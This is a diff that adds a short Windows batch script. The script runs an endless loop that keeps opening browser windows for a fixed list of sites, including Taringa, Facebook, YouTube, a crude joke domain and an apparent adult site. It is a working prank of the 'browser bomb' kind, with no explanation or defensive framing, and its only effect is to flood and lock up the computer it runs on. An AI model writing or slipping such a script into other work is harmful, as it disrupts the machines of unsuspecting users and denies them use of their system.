@@ -1,0 +1,23 @@
+@echo off
+:menu
+start www.taringa.net
+start www.taringa.net
+start www.taringa.net
+start www.taringa.net
+start www.taringa.net
+start www.***
+start www.xd.com
+start www.star.com
+start www.xd.com
+start www.facebook.com
+start www.twitter.com
+start www.tu.esgay.com
+start www.xxx.com
+start www.yahoo.com
+start www.google.co.ve
+start www.youtube.com
+start www.netcarshow.com
+start www.taringa.net
+start www.taringa.net
+start www.taringa.net
+goto menu
